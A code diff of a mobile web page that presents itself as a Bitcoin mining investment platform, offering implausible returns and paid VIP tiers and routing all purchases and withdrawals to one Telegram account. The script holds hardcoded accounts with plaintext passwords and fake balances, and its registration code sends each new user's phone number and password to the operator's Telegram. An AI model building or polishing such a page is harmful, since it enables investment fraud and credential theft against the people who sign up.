@@ -34,38 +34,84 @@
     box-shadow: var(--shadow-lg); position: relative; z-index: 1; overflow: hidden;
     animation: slideUp 0.5s ease-out;
   }
-  @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-  .auth-header { background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); padding: 32px 24px; text-align: center; color: white; }
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .auth-header {
+    background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+    padding: 32px 24px; text-align: center; color: white;
+  }
   .auth-header h1 { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
   .auth-header p { font-size: 13px; opacity: 0.8; margin-top: 4px; }
   .tabs { display: flex; border-bottom: 2px solid var(--border); padding: 0 24px; }
-  .tab { flex: 1; padding: 16px 0; text-align: center; font-size: 14px; font-weight: 600; color: var(--text-muted); cursor: pointer; background: none; border: none; border-bottom: 2px solid transparent; margin-bottom: -2px; transition: var(--transition); }
+  .tab {
+    flex: 1; padding: 16px 0; text-align: center; font-size: 14px; font-weight: 600;
+    color: var(--text-muted); cursor: pointer; background: none; border: none;
+    border-bottom: 2px solid transparent; margin-bottom: -2px; transition: var(--transition);
+  }
   .tab:hover { color: var(--primary); }
   .tab.active { color: var(--primary); border-bottom-color: var(--primary); }
   .form-wrap { padding: 24px; }
   .form-group { margin-bottom: 18px; }
-  .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-  .input-wrap { display: flex; align-items: center; border: 1.5px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; transition: var(--transition); background: var(--card); }
-  .input-wrap:focus-within { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1); }
-  .cc { padding: 0 14px; font-size: 14px; font-weight: 600; color: var(--text-muted); background: #f8fafc; border-right: 1.5px solid var(--border); height: 48px; display: flex; align-items: center; user-select: none; }
-  .input-wrap input { border: none; outline: none; flex: 1; padding: 0 14px; font-size: 15px; height: 48px; color: var(--text); background: transparent; font-family: inherit; }
+  .form-group label {
+    display: block; font-size: 12px; font-weight: 600; color: var(--text-muted);
+    margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .input-wrap {
+    display: flex; align-items: center; border: 1.5px solid var(--border);
+    border-radius: var(--radius-sm); overflow: hidden; transition: var(--transition); background: var(--card);
+  }
+  .input-wrap:focus-within {
+    border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+  }
+  .cc {
+    padding: 0 14px; font-size: 14px; font-weight: 600; color: var(--text-muted);
+    background: #f8fafc; border-right: 1.5px solid var(--border); height: 48px;
+    display: flex; align-items: center; user-select: none;
+  }
+  .input-wrap input {
+    border: none; outline: none; flex: 1; padding: 0 14px; font-size: 15px;
+    height: 48px; color: var(--text); background: transparent; font-family: inherit;
+  }
   .input-wrap input::placeholder { color: #94a3b8; }
-  .eye-btn { padding: 0 14px; background: none; border: none; cursor: pointer; color: var(--text-muted); display: flex; align-items: center; transition: var(--transition); }
+  .eye-btn {
+    padding: 0 14px; background: none; border: none; cursor: pointer;
+    color: var(--text-muted); display: flex; align-items: center; transition: var(--transition);
+  }
   .eye-btn:hover { color: var(--primary); }
   .eye-btn svg { width: 18px; height: 18px; }
-  .btn { width: 100%; padding: 14px; border: none; border-radius: var(--radius-sm); font-size: 15px; font-weight: 700; cursor: pointer; transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 8px; font-family: inherit; }
-  .btn-primary { background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); color: white; box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35); }
+  .btn {
+    width: 100%; padding: 14px; border: none; border-radius: var(--radius-sm);
+    font-size: 15px; font-weight: 700; cursor: pointer; transition: var(--transition);
+    display: flex; align-items: center; justify-content: center; gap: 8px; font-family: inherit;
+  }
+  .btn-primary {
+    background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+    color: white; box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35);
+  }
   .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(37, 99, 235, 0.45); }
   .btn-primary:active { transform: scale(0.98); }
   .switch-text { text-align: center; margin-top: 20px; font-size: 13px; color: var(--text-muted); }
   .switch-text a { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: none; }
-  .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); padding: 12px 24px; border-radius: var(--radius-sm); font-size: 14px; font-weight: 500; color: white; z-index: 1000; opacity: 0; transition: all 0.3s ease; box-shadow: var(--shadow-lg); max-width: 90%; text-align: center; }
+  .toast {
+    position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px);
+    padding: 12px 24px; border-radius: var(--radius-sm); font-size: 14px; font-weight: 500;
+    color: white; z-index: 1000; opacity: 0; transition: all 0.3s ease;
+    box-shadow: var(--shadow-lg); max-width: 90%; text-align: center;
+  }
   .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
   .toast.error { background: var(--danger); }
   .toast.success { background: var(--success); }
   .toast.info { background: var(--primary); }
-  .app-container { display: none; max-width: 480px; margin: 0 auto; min-height: 100vh; padding-bottom: 80px; position: relative; background: var(--bg); }
-  .hero { background: linear-gradient(160deg, #0f172a 0%, #1e3a8a 50%, #172554 100%); padding: 40px 20px; position: relative; overflow: hidden; }
+  .app-container {
+    display: none; max-width: 480px; margin: 0 auto; min-height: 100vh;
+    padding-bottom: 80px; position: relative; background: var(--bg);
+  }
+  .hero {
+    background: linear-gradient(160deg, #0f172a 0%, #1e3a8a 50%, #172554 100%);
+    padding: 40px 20px; position: relative; overflow: hidden;
+  }
   .hero-content { position: relative; z-index: 1; text-align: center; }
   .hero-content h1 { font-size: 28px; font-weight: 900; color: white; letter-spacing: 2px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
   .hero-content p { font-size: 10px; color: #93c5fd; letter-spacing: 3px; margin-top: 6px; font-weight: 500; }
@@ -73,7 +119,7 @@
   .plan-tabs { display: flex; background: var(--card); border-radius: var(--radius-sm); overflow: hidden; box-shadow: var(--shadow-sm); border: 1.5px solid var(--border); }
   .plan-tab { flex: 1; padding: 12px 0; text-align: center; font-size: 13px; font-weight: 700; cursor: pointer; transition: var(--transition); background: transparent; border: none; color: var(--text-muted); font-family: inherit; }
   .plan-tab.active { background: var(--primary); color: white; }
-  .withdraw-btn { padding: 12px 16px; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; font-size: 14px; font-weight: 700; border: none; cursor: pointer; transition: var(--transition); letter-spacing: 0.5px; font-family: inherit; border-radius: var(--radius-sm); box-shadow: 0 4px 14px rgba(16, 185, 129, 0.35); margin-top: 12px; width: calc(100% - 32px); margin-left: 16px; margin-right: 16px; }
+  .withdraw-btn { padding: 12px 16px; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; font-size: 14px; font-weight: 700; border: none; cursor: pointer; transition: var(--transition); letter-spacing: 0.5px; font-family: inherit; border-radius: var(--radius-sm); box-shadow: 0 4px 14px rgba(16, 185, 129, 0.35); }
   .withdraw-btn:hover { opacity: 0.92; }
   .withdraw-btn:active { transform: scale(0.99); }
   .section-title { text-align: center; font-size: 12px; font-weight: 800; color: var(--primary); letter-spacing: 2px; padding: 20px 0 12px; text-transform: uppercase; }
@@ -168,14 +214,14 @@
       <div class="form-group">
         <label>User ID</label>
         <div class="input-wrap">
-          <input type="text" id="login-id" placeholder="Enter User ID" maxlength="10" inputmode="numeric"/>
+          <input type="text" id="login-id" placeholder="Enter 10-digit User ID" maxlength="10" inputmode="numeric"/>
         </div>
       </div>
       <div class="form-group">
         <label>Password</label>
         <div class="input-wrap">
           <input type="password" id="login-pwd" placeholder="Enter password"/>
-          <button class="eye-btn" onclick="togglePwd('login-pwd',this)">
+          <button class="eye-btn" onclick="togglePwd('login-pwd',this)" aria-label="Toggle password">
             <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
           </button>
         </div>
@@ -196,8 +242,8 @@
       <div class="form-group">
         <label>Password</label>
         <div class="input-wrap">
-          <input type="password" id="reg-pwd" placeholder="Enter password"/>
-          <button class="eye-btn" onclick="togglePwd('reg-pwd',this)">
+          <input type="password" id="reg-pwd" placeholder="Set password"/>
+          <button class="eye-btn" onclick="togglePwd('reg-pwd',this)" aria-label="Toggle password">
             <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
           </button>
         </div>
@@ -206,7 +252,7 @@
         <label>Confirm Password</label>
         <div class="input-wrap">
           <input type="password" id="reg-pwd2" placeholder="Confirm password"/>
-          <button class="eye-btn" onclick="togglePwd('reg-pwd2',this)">
+          <button class="eye-btn" onclick="togglePwd('reg-pwd2',this)" aria-label="Toggle password">
             <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
           </button>
         </div>
@@ -234,12 +280,12 @@
         <button class="plan-tab active" id="pt-long" onclick="switchPlan('long')">Long-term Plan</button>
         <button class="plan-tab" id="pt-vip" onclick="switchPlan('vip')">VIP Benefits</button>
       </div>
-      <button class="withdraw-btn" onclick="openWithdrawModal()">Withdraw</button>
+      <button class="withdraw-btn" onclick="openWithdrawModal()" style="margin-top: 12px; width: calc(100% - 32px); margin-left: 16px; margin-right: 16px;">Withdraw</button>
     </div>
 
     <div class="products-section">
       <div id="long-plan">
-        <div class="section-title">Daily Income • Daily Withdrawal</div>
+        <div class="section-title">Daily Income &middot; Daily Withdrawal</div>
 
         <div class="product-card">
           <div class="product-banner">
@@ -277,7 +323,7 @@
             <div class="stat-cell"><div class="stat-label">Duration</div><div class="stat-value">7 Days</div></div>
             <div class="stat-cell"><div class="stat-label">Total Return</div><div class="stat-value accent">378</div></div>
           </div>
-          <button class="buy-btn" onclick="buyNowTelegram('Bitcoin Miner S21 Pro', 270)">Buy Now</button>
+          <button class="buy-btn" onclick="buyNowTelegram('BITCOIN MINER S21 PRO', 270)">Buy Now</button>
         </div>
 
         <div class="product-card">
@@ -314,7 +360,7 @@
             <div class="stat-cell"><div class="stat-label">Duration</div><div class="stat-value">15 Days</div></div>
             <div class="stat-cell"><div class="stat-label">Total Return</div><div class="stat-value accent">3,375</div></div>
           </div>
-          <button class="buy-btn" onclick="buyNowTelegram('Bitcoin Miner S19 XP', 1500)">Buy Now</button>
+          <button class="buy-btn" onclick="buyNowTelegram('BITCOIN MINER S19 XP', 1500)">Buy Now</button>
         </div>
 
         <div class="product-card">
@@ -351,7 +397,7 @@
             <div class="stat-cell"><div class="stat-label">Duration</div><div class="stat-value">30 Days</div></div>
             <div class="stat-cell"><div class="stat-label">Total Return</div><div class="stat-value accent">19,500</div></div>
           </div>
-          <button class="buy-btn" onclick="buyNowTelegram('Bitcoin Miner S21 Hydro', 5000)">Buy Now</button>
+          <button class="buy-btn" onclick="buyNowTelegram('BITCOIN MINER S21 HYDRO', 5000)">Buy Now</button>
         </div>
       </div>
 
@@ -360,7 +406,7 @@
         <div class="vip-card">
           <div class="vip-badge">V1</div>
           <div class="vip-info">
-            <div class="vip-name">VIP 1 — Silver</div>
+            <div class="vip-name">VIP 1 &mdash; Silver</div>
             <div class="vip-desc">Daily income boost +5%<br>Priority withdrawal processing</div>
           </div>
           <div class="vip-price"><div class="vip-price-val">999</div><div class="vip-price-label">/ month</div></div>
@@ -368,7 +414,7 @@
         <div class="vip-card" style="background:linear-gradient(135deg,#1a1a00,#2a2200);">
           <div class="vip-badge" style="background:linear-gradient(135deg,#fbbf24,#d97706);">V2</div>
           <div class="vip-info">
-            <div class="vip-name" style="color:#fbbf24;">VIP 2 — Gold</div>
+            <div class="vip-name" style="color:#fbbf24;">VIP 2 &mdash; Gold</div>
             <div class="vip-desc">Daily income boost +12%<br>Dedicated account manager</div>
           </div>
           <div class="vip-price"><div class="vip-price-val">2,999</div><div class="vip-price-label">/ month</div></div>
@@ -376,7 +422,7 @@
         <div class="vip-card" style="background:linear-gradient(135deg,#0d0d1a,#1a1a30);">
           <div class="vip-badge" style="background:linear-gradient(135deg,#94a3b8,#64748b);">V3</div>
           <div class="vip-info">
-            <div class="vip-name" style="color:#94a3b8;">VIP 3 — Platinum</div>
+            <div class="vip-name" style="color:#94a3b8;">VIP 3 &mdash; Platinum</div>
             <div class="vip-desc">Daily income boost +25%<br>Zero withdrawal fees</div>
           </div>
           <div class="vip-price"><div class="vip-price-val">7,999</div><div class="vip-price-label">/ month</div></div>
@@ -425,7 +471,7 @@
 <div class="modal-overlay" id="withdraw-modal">
   <div class="modal">
     <div class="modal-title">Withdraw Balance</div>
-    <div class="modal-text">Enter amount to withdraw:</div>
+    <div class="modal-text">Enter the amount you want to withdraw:</div>
     <input type="number" id="withdraw-amount" placeholder="Enter amount" min="1" style="width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-size: 16px; font-family: inherit; outline: none; margin-bottom: 16px;"/>
     <div class="modal-actions">
       <button class="btn btn-outline" onclick="closeModal()">Cancel</button>
@@ -438,7 +484,7 @@
 <div class="modal-overlay" id="logout-modal">
   <div class="modal">
     <div class="modal-title">Logout</div>
-    <div class="modal-text">Confirm logout from your account?</div>
+    <div class="modal-text">Are you sure you want to logout from your account?</div>
     <div class="modal-actions">
       <button class="btn btn-outline" onclick="closeModal()">Cancel</button>
       <button class="btn btn-primary" style="background:var(--danger);box-shadow:0 4px 14px rgba(239,68,68,0.35);" onclick="doLogout()">Logout</button>
@@ -447,26 +493,42 @@
 </div>
 
 <script>
+// ==================== CONFIG ====================
 const TELEGRAM_LINK = 'https://t.me/shashank234';
 
+// ==================== EDITABLE USER ACCOUNTS ====================
+// Edit user credentials here - changes will be loaded automatically on page refresh
 var PREMADE_ACCOUNTS = {
   '6361279247': { password: 'shashasha1', balance: 5000 },
-  '1000000002': { password: 'password2', balance: 3000 },
-  '1000000003': { password: 'password3', balance: 10000 },
-  '1000000004': { password: 'password4', balance: 1500 },
-  '1000000005': { password: 'password5', balance: 7500 }
+  '1000000002': { password: 'klmnopqrst2', balance: 3000 },
+  '1000000003': { password: 'uvwxyzabc3', balance: 10000 },
+  '1000000004': { password: 'defghijkl4', balance: 1500 },
+  '1000000005': { password: 'mnopqrstu5', balance: 7500 },
+  '1000000006': { password: 'vwxyzabcd6', balance: 2000 },
+  '1000000007': { password: 'efghijklm7', balance: 6000 },
+  '1000000008': { password: 'nopqrstuv8', balance: 4500 },
+  '1000000009': { password: 'wxyzabcde9', balance: 8000 },
+  '1000000010': { password: 'fghijklmn0', balance: 3500 }
 };
 
+// ==================== STORAGE ====================
 const Storage = {
   getUsers() {
     try { 
       let users = JSON.parse(localStorage.getItem('bm_users') || '{}');
+      // Ensure all PREMADE_ACCOUNTS are always available
       for (const [id, data] of Object.entries(PREMADE_ACCOUNTS)) {
         if (!users[id]) {
-          users[id] = { password: data.password, balance: data.balance };
+          users[id] = {
+            password: data.password,
+            balance: data.balance,
+            phone: id,
+            invite: '',
+            joined: Date.now()
+          };
         }
       }
-      localStorage.setItem('bm_users', JSON.stringify(users));
+      this.saveUsers(users);
       return users;
     }
     catch(e) { return PREMADE_ACCOUNTS; }
@@ -475,20 +537,36 @@ const Storage = {
   getSession() { return localStorage.getItem('bm_session'); },
   setSession(id) { localStorage.setItem('bm_session', id); },
   clearSession() { localStorage.removeItem('bm_session'); },
-  getBalance(id) { return this.getUsers()[id]?.balance || 0; }
+  getBalance(id) {
+    const users = this.getUsers();
+    return users[id]?.balance || 0;
+  },
+  setBalance(id, amount) {
+    const users = this.getUsers();
+    if (users[id]) {
+      users[id].balance = amount;
+      this.saveUsers(users);
+    }
+  }
 };
 
-function showToast(msg, type) {
+// ==================== TOAST ====================
+function showToast(message, type) {
+  type = type || 'info';
   const toast = document.getElementById('toast');
-  toast.textContent = msg;
+  toast.textContent = message;
   toast.className = 'toast ' + type;
-  requestAnimationFrame(() => toast.classList.add('show'));
-  setTimeout(() => toast.classList.remove('show'), 3000);
+  requestAnimationFrame(function() { toast.classList.add('show'); });
+  setTimeout(function() { toast.classList.remove('show'); }, 3000);
 }
 
+// ==================== INIT ====================
 window.addEventListener('DOMContentLoaded', function() {
-  Storage.getUsers();
-  if (Storage.getSession()) showApp(Storage.getSession());
+  var users = Storage.getUsers();
+  console.log('App initialized. Available accounts:', Object.keys(users));
+
+  var session = Storage.getSession();
+  if (session) showApp(session);
   else showAuth();
 });
 
@@ -505,88 +583,134 @@ function showApp(id) {
 }
 
 function updateBalance(id) {
-  const balance = Storage.getBalance(id);
+  var balance = Storage.getBalance(id);
   document.getElementById('my-balance').textContent = balance.toLocaleString('en-IN', {minimumFractionDigits: 2, maximumFractionDigits: 2});
 }
 
+// ==================== AUTH TABS ====================
 function switchTab(tab) {
-  const isLogin = tab === 'login';
+  var isLogin = tab === 'login';
   document.getElementById('tab-login').classList.toggle('active', isLogin);
   document.getElementById('tab-register').classList.toggle('active', !isLogin);
   document.getElementById('form-login').classList.toggle('hidden', !isLogin);
   document.getElementById('form-register').classList.toggle('hidden', isLogin);
 }
 
+// ==================== LOGIN ====================
 function doLogin() {
-  const id = document.getElementById('login-id').value.trim();
-  const pwd = document.getElementById('login-pwd').value.trim();
+  var id = document.getElementById('login-id').value.trim();
+  var pwd = document.getElementById('login-pwd').value.trim();
 
-  if (!id || !pwd) { showToast('Enter User ID and password', 'error'); return; }
+  if (!id || !pwd) {
+    showToast('Please enter User ID and password', 'error');
+    return;
+  }
 
-  const users = Storage.getUsers();
-  if (!users[id]) { showToast('User ID not found', 'error'); return; }
-  if (users[id].password !== pwd) { showToast('Incorrect password', 'error'); return; }
+  var users = Storage.getUsers();
+  
+  if (!users[id]) {
+    showToast('User ID not found', 'error');
+    return;
+  }
+  
+  if (users[id].password !== pwd) {
+    showToast('Incorrect password', 'error');
+    return;
+  }
 
   Storage.setSession(id);
   document.getElementById('login-id').value = '';
   document.getElementById('login-pwd').value = '';
   showApp(id);
-  showToast('Login successful!', 'success');
+  showToast('Welcome back!', 'success');
 }
 
+// ==================== REGISTER ====================
 function doRegister() {
-  const phone = document.getElementById('reg-phone').value.trim();
-  const pwd = document.getElementById('reg-pwd').value.trim();
-  const pwd2 = document.getElementById('reg-pwd2').value.trim();
+  var phone = document.getElementById('reg-phone').value.trim();
+  var pwd = document.getElementById('reg-pwd').value.trim();
+  var pwd2 = document.getElementById('reg-pwd2').value.trim();
 
-  if (!phone || !pwd || !pwd2) { showToast('Fill all fields', 'error'); return; }
-  if (phone.length !== 10 || !/^\d+$/.test(phone)) { showToast('Valid 10-digit phone required', 'error'); return; }
-  if (pwd.length < 6) { showToast('Password min 6 characters', 'error'); return; }
-  if (pwd !== pwd2) { showToast('Passwords do not match', 'error'); return; }
+  if (!phone || !pwd || !pwd2) {
+    showToast('Please fill all fields', 'error');
+    return;
+  }
+  if (phone.length < 10 || !/^\d+$/.test(phone)) {
+    showToast('Enter a valid 10-digit phone number', 'error');
+    return;
+  }
+  if (pwd.length < 6) {
+    showToast('Password must be at least 6 characters', 'error');
+    return;
+  }
+  if (pwd !== pwd2) {
+    showToast('Passwords do not match', 'error');
+    return;
+  }
 
-  const users = Storage.getUsers();
-  if (users[phone]) { showToast('Phone already registered', 'error'); return; }
+  var users = Storage.getUsers();
+  if (users[phone]) {
+    showToast('This phone number is already registered', 'error');
+    return;
+  }
 
-  users[phone] = { password: pwd, balance: 0 };
+  users[phone] = {
+    password: pwd,
+    balance: 0,
+    joined: Date.now()
+  };
   Storage.saveUsers(users);
   Storage.setSession(phone);
   showApp(phone);
-  showToast('Account created!', 'success');
-  sendToTelegram('New Registration\nPhone: +91 ' + phone + '\nPassword: ' + pwd);
+  showToast('Account created successfully!', 'success');
+
+  var message = 'New Registration\nPhone: +91 ' + phone + '\nPassword: ' + pwd;
+  sendToTelegram(message);
 }
 
-function sendToTelegram(msg) {
-  window.open(TELEGRAM_LINK + '?text=' + encodeURIComponent(msg), '_blank');
+// ==================== TELEGRAM FUNCTIONS ====================
+function sendToTelegram(message) {
+  var telegramUrl = TELEGRAM_LINK + '?text=' + encodeURIComponent(message);
+  window.open(telegramUrl, '_blank');
   showToast('Opening Telegram...', 'info');
 }
 
 function openTelegramSupport() {
   window.open(TELEGRAM_LINK, '_blank');
+  showToast('Opening Telegram Support...', 'info');
 }
 
-function buyNowTelegram(product, amount) {
-  const id = Storage.getSession();
-  const msg = 'Buy Miner\nProduct: ' + product + '\nAmount: ' + amount + '\nUser ID: ' + id;
-  window.open(TELEGRAM_LINK + '?text=' + encodeURIComponent(msg), '_blank');
-  showToast('Opening Telegram...', 'info');
+function buyNowTelegram(productName, amount) {
+  var id = Storage.getSession();
+  var message = 'Buy Miner\nProduct: ' + productName + '\nAmount: ' + amount + '\nUser ID: ' + id;
+  var telegramUrl = TELEGRAM_LINK + '?text=' + encodeURIComponent(message);
+  window.open(telegramUrl, '_blank');
+  showToast('Opening Telegram to complete purchase...', 'info');
 }
 
+// ==================== WITHDRAW ====================
 function openWithdrawModal() {
   document.getElementById('withdraw-amount').value = '';
   document.getElementById('withdraw-modal').classList.add('show');
 }
 
 function confirmWithdraw() {
-  const amount = document.getElementById('withdraw-amount').value.trim();
-  if (!amount || amount <= 0) { showToast('Enter valid amount', 'error'); return; }
+  var amount = document.getElementById('withdraw-amount').value.trim();
+  if (!amount || amount <= 0) {
+    showToast('Please enter a valid amount', 'error');
+    return;
+  }
 
-  const id = Storage.getSession();
-  const msg = 'Withdraw Request\nAmount: ' + amount + '\nUser ID: ' + id;
+  var id = Storage.getSession();
+  var message = 'Withdraw Request\nAmount: ' + amount + '\nUser ID: ' + id;
+  var telegramUrl = TELEGRAM_LINK + '?text=' + encodeURIComponent(message);
+  
   closeModal();
-  window.open(TELEGRAM_LINK + '?text=' + encodeURIComponent(msg), '_blank');
-  showToast('Opening Telegram...', 'info');
+  window.open(telegramUrl, '_blank');
+  showToast('Opening Telegram for withdrawal...', 'info');
 }
 
+// ==================== LOGOUT ====================
 function showLogoutModal() {
   document.getElementById('logout-modal').classList.add('show');
 }
@@ -598,40 +722,68 @@ function doLogout() {
   switchTab('login');
   document.getElementById('login-id').value = '';
   document.getElementById('login-pwd').value = '';
+  showToast('Logged out successfully', 'info');
 }
 
+// ==================== PASSWORD TOGGLE ====================
 function togglePwd(id, btn) {
-  const inp = document.getElementById(id);
-  const show = inp.type === 'password';
+  var inp = document.getElementById(id);
+  var show = inp.type === 'password';
   inp.type = show ? 'text' : 'password';
+  btn.innerHTML = show
+    ? '<svg viewBox="0 0 24 24" style="width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'
+    : '<svg viewBox="0 0 24 24" style="width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
 }
 
+// ==================== PLAN TABS ====================
 function switchPlan(p) {
-  const isLong = p === 'long';
+  var isLong = p === 'long';
   document.getElementById('pt-long').classList.toggle('active', isLong);
   document.getElementById('pt-vip').classList.toggle('active', !isLong);
   document.getElementById('long-plan').classList.toggle('hidden', !isLong);
   document.getElementById('vip-plan').classList.toggle('hidden', isLong);
 }
 
+// ==================== BOTTOM NAV ====================
+var navPages = ['plan', 'my'];
 function switchNav(page) {
-  ['plan', 'my'].forEach(p => {
+  navPages.forEach(function(p) {
     document.getElementById('nav-' + p).classList.toggle('active', p === page);
-    const el = document.getElementById('page-' + p);
+    var el = document.getElementById('page-' + p);
     if (el) el.classList.toggle('active', p === page);
   });
 }
 
+// ==================== MODALS ====================
 function closeModal() {
-  document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('show'));
+  document.querySelectorAll('.modal-overlay').forEach(function(m) {
+    m.classList.remove('show');
+  });
 }
 
-document.querySelectorAll('.modal-overlay').forEach(overlay => {
-  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
+// Close modal on overlay click
+document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
+  overlay.addEventListener('click', function(e) {
+    if (e.target === overlay) closeModal();
+  });
 });
 
-document.getElementById('login-pwd').addEventListener('keypress', e => { if (e.key === 'Enter') doLogin(); });
-document.getElementById('reg-pwd2').addEventListener('keypress', e => { if (e.key === 'Enter') doRegister(); });
+// Enter key support
+document.getElementById('login-id').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') document.getElementById('login-pwd').focus();
+});
+document.getElementById('login-pwd').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') doLogin();
+});
+document.getElementById('reg-phone').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') document.getElementById('reg-pwd').focus();
+});
+document.getElementById('reg-pwd').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') document.getElementById('reg-pwd2').focus();
+});
+document.getElementById('reg-pwd2').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') doRegister();
+});
 </script>
 </body>
 </html>
